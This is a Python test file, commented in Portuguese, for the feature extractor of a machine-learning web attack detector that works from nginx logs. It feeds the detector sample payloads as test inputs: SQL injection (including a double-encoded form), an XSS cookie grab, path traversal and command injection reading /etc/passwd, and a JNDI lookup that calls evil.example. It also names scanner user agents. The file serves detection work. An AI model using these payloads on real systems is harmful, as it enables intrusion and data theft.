"""Feature extraction tests.

O contrato que interessa: **sempre 35 floats finitos em [0, 1]**, para qualquer
entrada. Uma feature fora de faixa não gera erro — só desloca a distribuição que o
modelo aprendeu, e a detecção degrada sem que nada apareça no log.
"""

from __future__ import annotations

import math

import pytest

from app.ml import features_spec as fs
from app.ml.features_spec import FEATURE_COUNT, FEATURE_INDEX, FEATURE_NAMES
from app.pipeline.stage2_features import FeatureExtractor, WindowStats
from tests.conftest import make_entry


def vector_for(**overrides: object) -> list[float]:
    window = overrides.pop("window", WindowStats())
    country = overrides.pop("country", None)
    return FeatureExtractor.build_vector(
        make_entry(**overrides),
        window,  # type: ignore[arg-type]
        country,  # type: ignore[arg-type]
    )


# --------------------------------------------------------------------------
# O contrato
# --------------------------------------------------------------------------


def test_contract_is_35_dimensions() -> None:
    assert FEATURE_COUNT == 35
    assert len(FEATURE_NAMES) == 35
    assert len(set(FEATURE_NAMES)) == 35, "nome de feature duplicado"


def test_benign_request_produces_valid_vector(benign_entry: object) -> None:
    vector = FeatureExtractor.build_vector(benign_entry, WindowStats(), "BR")  # type: ignore[arg-type]
    assert len(vector) == FEATURE_COUNT
    assert all(math.isfinite(v) for v in vector)
    assert all(0.0 <= v <= 1.0 for v in vector)


@pytest.mark.parametrize(
    ("label", "overrides"),
    [
        ("campos vazios", {"path": "", "query": "", "user_agent": "", "referer": ""}),
        ("path gigante", {"path": "/" + "a" * 10_000}),
        ("query gigante", {"query": "x=" + "b" * 10_000}),
        ("bytes negativo", {"bytes_sent": -1}),
        ("status zero", {"status": 0}),
        ("status absurdo", {"status": 999}),
        ("método desconhecido", {"method": "FROBNICATE"}),
        ("método vazio", {"method": ""}),
        ("protocolo lixo", {"protocol": "\x00\x01"}),
        ("bytes enorme", {"bytes_sent": 2**62}),
        ("unicode no path", {"path": "/café/日本語/🔥"}),
        ("nulos no path", {"path": "/a\x00b\x01c"}),
        ("só separadores", {"path": "///////", "query": "&&&&&"}),
        ("query sem igual", {"query": "abc&def&ghi"}),
    ],
)
def test_hostile_input_still_yields_valid_vector(label: str, overrides: dict[str, object]) -> None:
    """Nenhuma entrada pode produzir NaN, infinito ou valor fora de [0, 1]."""
    vector = vector_for(**overrides)
    assert len(vector) == FEATURE_COUNT, label
    assert all(math.isfinite(v) for v in vector), f"{label}: valor não finito"
    assert all(0.0 <= v <= 1.0 for v in vector), f"{label}: fora de [0, 1]"


def test_extraction_is_deterministic() -> None:
    """Mesma entrada, mesmo vetor.

    Se isto falhar, treino e inferência divergem e nenhuma métrica é confiável.
    """
    kwargs: dict[str, object] = {"path": "/busca", "query": "q=teste&pagina=3"}
    assert vector_for(**kwargs) == vector_for(**kwargs)


# --------------------------------------------------------------------------
# As features carregam o sinal que deveriam
# --------------------------------------------------------------------------


def test_sql_tokens_detected_through_double_encoding() -> None:
    """Codificação dupla é a evasão mais barata que existe.

    %2527 decodifica para %27 e só então para a aspa. Contar tokens sobre o texto
    cru deixaria isto passar inteiro.
    """
    index = FEATURE_INDEX["sql_token_count"]
    plain = vector_for(query="id=1' UNION SELECT password FROM users--")
    double = vector_for(query="id=1%2527%2520UNION%2520SELECT%2520password--")
    benign = vector_for(query="id=42")

    assert plain[index] > 0.0
    assert double[index] > 0.0, "codificação dupla escapou da contagem de tokens"
    assert benign[index] == 0.0


def test_double_encoding_itself_is_a_feature() -> None:
    index = FEATURE_INDEX["double_encoded_count"]
    assert vector_for(query="p=%252e%252e%252f")[index] > 0.0
    assert vector_for(query="p=normal")[index] == 0.0


@pytest.mark.parametrize(
    ("feature", "payload"),
    [
        ("xss_token_count", "<script>alert(document.cookie)</script>"),
        ("traversal_token_count", "../../../../etc/passwd"),
        ("cmdi_token_count", "; cat /etc/passwd"),
        ("jndi_token_count", "${jndi:ldap://evil.example/a}"),
    ],
)
def test_attack_token_features_fire(feature: str, payload: str) -> None:
    index = FEATURE_INDEX[feature]
    assert vector_for(query=f"input={payload}")[index] > 0.0
    assert vector_for(query="input=texto normal")[index] == 0.0


def test_scanner_user_agent_flagged() -> None:
    index = FEATURE_INDEX["ua_is_known_scanner"]
    assert vector_for(user_agent="sqlmap/1.8#stable")[index] == 1.0
    assert vector_for(user_agent="Nikto/2.5.0")[index] == 1.0
    assert vector_for(user_agent="Mozilla/5.0 (Windows NT 10.0) Chrome/131")[index] == 0.0


def test_empty_user_agent_flagged() -> None:
    index = FEATURE_INDEX["ua_is_empty"]
    assert vector_for(user_agent="")[index] == 1.0
    assert vector_for(user_agent="-")[index] == 1.0
    assert vector_for(user_agent="Mozilla/5.0")[index] == 0.0


def test_nginx_dash_means_absent_not_present() -> None:
    """O nginx grava "-" quando o cabeçalho não veio.

    Regressão de um bug real: "-" era tratado como referer presente, então toda
    requisição sem Referer — a maioria do tráfego de API e de bot — caía numa
    faixa intermediária que não existe. Isso deslocava a distribuição aprendida e
    contribuiu para páginas como /sobre e /contato serem marcadas HIGH.
    """
    index = FEATURE_INDEX["referer_state"]
    assert vector_for(referer="-")[index] == 0.0
    assert vector_for(referer="")[index] == 0.0
    assert vector_for(referer="/produtos")[index] == 0.5
    assert vector_for(referer="https://google.com/")[index] == 1.0


def test_suspicious_extension() -> None:
    index = FEATURE_INDEX["suspicious_extension"]
    assert vector_for(path="/uploads/shell.php")[index] == 1.0
    assert vector_for(path="/.env")[index] == 1.0
    assert vector_for(path="/assets/logo.png")[index] == 0.0
    assert vector_for(path="/sem-extensao")[index] == 0.0


def test_hour_is_cyclic() -> None:
    """23h e 0h precisam ficar próximos, não em extremos opostos."""
    sin_i, cos_i = FEATURE_INDEX["hour_sin"], FEATURE_INDEX["hour_cos"]

    def point(hour: int) -> tuple[float, float]:
        from datetime import UTC, datetime

        v = vector_for(ts=datetime(2026, 8, 6, hour, 0, 0, tzinfo=UTC))
        return v[sin_i], v[cos_i]

    def distance(a: tuple[float, float], b: tuple[float, float]) -> float:
        return math.hypot(a[0] - b[0], a[1] - b[1])

    assert distance(point(23), point(0)) < distance(point(23), point(12))


def test_window_features_reflect_scanning_behaviour() -> None:
    """Rajada de 404 em muitos paths distintos é a assinatura de varredura."""
    quiet = vector_for(window=WindowStats(request_count=1, unique_paths=1))
    scanning = vector_for(
        window=WindowStats(
            request_count=200,
            unique_paths=180,
            error_rate=0.95,
            mean_interarrival=0.05,
            burstiness=0.1,
        )
    )
    assert (
        scanning[FEATURE_INDEX["window_request_count"]]
        > quiet[FEATURE_INDEX["window_request_count"]]
    )
    assert (
        scanning[FEATURE_INDEX["window_unique_paths"]] > quiet[FEATURE_INDEX["window_unique_paths"]]
    )
    assert scanning[FEATURE_INDEX["window_error_rate"]] > 0.9
    # Intervalo é invertido: mais rápido = feature mais alta.
    assert scanning[FEATURE_INDEX["window_mean_interarrival"]] > 0.9


def test_country_risk_defaults_to_zero_without_geoip() -> None:
    """Sem base GeoIP a dimensão zera — degrada, não quebra."""
    assert vector_for(country=None)[FEATURE_INDEX["country_risk"]] == 0.0
    assert vector_for(country="CN")[FEATURE_INDEX["country_risk"]] > 0.0


# --------------------------------------------------------------------------
# Helpers de normalização
# --------------------------------------------------------------------------


def test_saturate_is_monotonic_and_bounded() -> None:
    """Saturação preserva ordenação acima do ponto de corte.

    É a diferença para min(x/s, 1): um path de 5000 caracteres continua acima de
    um de 500, em vez de ambos virarem 1.0 e perderem o sinal.
    """
    values = [fs.saturate(x, 64) for x in (0, 1, 10, 64, 500, 5000, 10**9)]
    assert values == sorted(values)
    assert all(0.0 <= v < 1.0 for v in values)
    assert fs.saturate(64, 64) == pytest.approx(0.5)


def test_saturate_handles_degenerate_input() -> None:
    assert fs.saturate(-5, 64) == 0.0
    assert fs.saturate(10, 0) == 0.0


def test_clamp01_kills_nan_and_inf() -> None:
    assert fs.clamp01(float("nan")) == 0.0
    assert fs.clamp01(float("inf")) == 0.0
    assert fs.clamp01(float("-inf")) == 0.0
    assert fs.clamp01(-3.0) == 0.0
    assert fs.clamp01(7.0) == 1.0


def test_entropy_separates_random_from_readable() -> None:
    assert fs.shannon_entropy("") == 0.0
    assert fs.shannon_entropy("aaaaaaaa") == 0.0
    assert fs.shannon_entropy("/api/v1/usuarios") < fs.shannon_entropy("aB3$xK9!zQ7@mN2#")


def test_validate_vector_rejects_wrong_length() -> None:
    with pytest.raises(ValueError, match="35"):
        fs.validate_vector([0.5] * 34)


def test_validate_vector_repairs_out_of_range() -> None:
    repaired = fs.validate_vector([2.0] + [float("nan")] * 33 + [-1.0])
    assert repaired[0] == 1.0
    assert repaired[1] == 0.0
    assert repaired[-1] == 0.0
